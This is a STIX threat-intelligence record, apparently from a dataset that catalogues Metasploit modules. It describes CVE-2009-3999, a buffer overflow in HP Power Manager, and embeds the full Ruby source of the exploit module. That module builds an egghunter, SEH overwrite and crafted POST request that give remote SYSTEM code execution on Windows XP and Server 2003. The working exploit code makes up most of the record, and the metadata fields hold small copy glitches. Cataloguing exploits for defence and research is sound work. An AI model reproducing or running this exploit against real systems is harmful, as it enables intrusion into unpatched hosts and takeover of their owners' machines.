{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3f52bc06-c5f1-4cf5-b962-3e6bb643decf",
    "created": "2024-08-14T16:54:05.140821Z",
    "modified": "2024-08-14T16:54:05.140825Z",
    "name": "\"HP Power Manager formExportDataLogs Buffer Overflow\"",
    "description": " This module exploits a buffer overflow in HP Power Manager's 'formExportDataLogs'. By creating a malformed request specifically for the fileName parameter, a stack-based buffer overflow occurs due to a long error message (which contains the fileName) which may result in arbitrary remote code execution under the context of 'SYSTEM'.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_power_manager_filename.rb",
            "external_id": "hp_power_manager_filename.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3999"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => \"HP Power Manager 'formExportDataLogs' Buffer Overflow\",\n      'Description'     => %q{\n          This module exploits a buffer overflow in HP Power Manager's 'formExportDataLogs'.\n        By creating a malformed request specifically for the fileName parameter, a stack-based\n        buffer overflow occurs due to a long error message (which contains the fileName),\n        which may result in arbitrary remote code execution under the context of 'SYSTEM'.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          # Original discovery (Secunia Research)\n          'Alin Rad Pop',\n          # Metasploit module (thx DcLabs members, corelanc0d3r, humble-desser, Jason Kratzer)\n          'Rodrigo Escobar <ipax[at]dclabs.com.br>',\n          # Metasploit fu\n          'sinn3r'\n        ],\n      'References'      =>\n        [\n          [ 'CVE', '2009-3999' ],\n          [ 'OSVDB', '61848'],\n          [ 'BID', '37867' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Platform'        => 'win',\n      'Payload'         =>\n        {\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c&=+?:;-,/#.\\\\$%\\x1a\",\n          'DisableNops' => true,\n          'EncoderOptions' => {'BufferRegister' => 'EDI' }  # Egghunter jmp edi\n        },\n      'Targets'         =>\n        [\n          [\n            # Tested on HP Power Manager 4.2 (Build 7 and 9)\n            'Windows XP SP3 / Win Server 2003 SP0',\n            {\n              'Ret'    => 0x004174d5,  #pop esi # pop ebx # ret 10 (DevManBE.exe)\n              'Offset' => 721\n            }\n          ]\n        ],\n      'Privileged'      => false,\n      'DisclosureDate'  => '2011-10-19',\n      'DefaultTarget'   => 0))\n  end\n\n  def exploit\n    print_status(\"Generating payload...\")\n\n    # Randomize the tag by not specifying one\n    eggoptions = { :checksum => true }\n\n    hunter,egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)\n\n    buffer  = rand_text_alpha_upper(target['Offset'] - hunter.length)\n    buffer << make_nops(30) + hunter\n    buffer << \"\\xeb\\xc2\\x90\\x90\"           #JMP SHORT 0xC2\n    buffer << [target.ret].pack('V*')[0,3] #SEH (strip the null byte, HP PM will pad it for us)\n\n    # Let's make the request a little bit more realistic looking\n    time = Time.new\n\n    print_status(\"Trying target #{target.name}...\")\n    connect\n\n    request = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => '/goform/formExportDataLogs',\n      'vars_post' => {\n        'dataFormat' => 'comma',\n        'exportto'   => 'file',\n        'fileName'   => buffer,\n        'bMonth'     => \"%02d\" %time.month,\n        'bDay'       => \"%02d\" %time.day,\n        'bYear'      => time.year.to_s,\n        'eMonth'     => \"%02d\" %time.month,\n        'eDay'       => \"%02d\" %time.day,\n        'eYear'      => time.year.to_s,\n        'LogType'    => 'Application',\n        'actionType' => '1%3B'\n      },\n      'headers' =>\n        {\n          'Accept'  => egg,\n          'Referer' => \"http://#{rhost}/Contents/exportLogs.asp?logType=Application\"\n        }\n    }, 5)\n\n    print_status(\"Payload sent! Go grab a coffee, the CPU is gonna work hard for you! :)\")\n\n    # Wait for a bit longer. For some reason it may take some time for the process to start\n    # handling our request.\n    select(nil, nil, nil, 7)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-10-19",
    "x_mitre_platforms": [
        "win'"
    ]
}